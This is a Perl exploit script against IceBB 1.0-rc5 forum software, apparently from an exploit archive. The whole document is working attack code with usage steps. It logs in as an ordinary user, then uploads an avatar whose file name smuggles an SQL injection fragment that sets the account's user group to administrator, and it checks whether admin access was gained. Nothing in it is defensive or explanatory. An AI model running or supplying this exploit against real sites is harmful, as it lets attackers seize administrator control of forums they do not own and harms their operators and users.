IceBB 1.0-rc5 Remote Create Admin Exploit
=========================================



#!/usr/bin/perl
#  IceBB 1.0-rc5 Remote Create Admin Exploit
#  1. register a user
#  2. run this exploit with this usage : $perl xpl.pl [host&path] [uname] [pass]
#  3. login with admin access :)
# - magic_quotes_gpc = Off
#

use LWP::UserAgent;
use HTTP::Cookies;

$port = "80";
 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;

 print q(
 ###########################################################
 #        IceBB 1.0-rc5 Remote Create Admin Exploit        #
 ################# (C)oded By Hessam-x #####################

);


 if (@ARGV < 3) {
 print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
 exit();
 }

   print " [~] User/Password : $uname/$passwd \n";
   print " [~] Host : $host \n";

 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );


$login = $xpl->post($url.&#039;index.php&#039;,
Content => [
 &#039;act&#039; => &#039;login&#039;,
&#039;from&#039; => &#039;index.php&#039;,
&#039;user&#039; => $uname,
&#039;pass&#039; => $passwd,
&#039;func&#039; => &#039;Login&#039;,
],);

 if($cookie_jar->as_string =~ /icebb_sessid=(.*?);/) {
       $cookie = $1;
   print " [~] Logined ...\n";
 } else {
 print " [-] Can not Login In $host !\n";
 exit();
 }

 $badcode = "&#039;, user_group=&#039;1";
 $avat = $xpl->post($url.&#039;index.php&#039;,Content_Type => &#039;form-data&#039;,
 Content => [
 &#039;avtype&#039;  => &#039;upload&#039;,
 &#039;act&#039; => &#039;ucp&#039;,
 &#039;func&#039; => &#039;avatar&#039;,
 &#039;file&#039;   => [
              undef,
              &#039;avatar.jpg&#039;.$badcode,
              Content_type => &#039;text/plain&#039;,
              Content => &#039;MYAVATAR&#039;,
             ],
 &#039;submit&#039;        => &#039;Save&#039;,
 ],
 );
 $test = $xpl->get($url.&#039;index.php&#039;);
if($test->as_string =~ /Admin Control Center/) {
print " [+] You Are admin Now ! \n";
} else {
print " [-] Exploit Failed ! \n";
}
print "\n #################################################### \n";



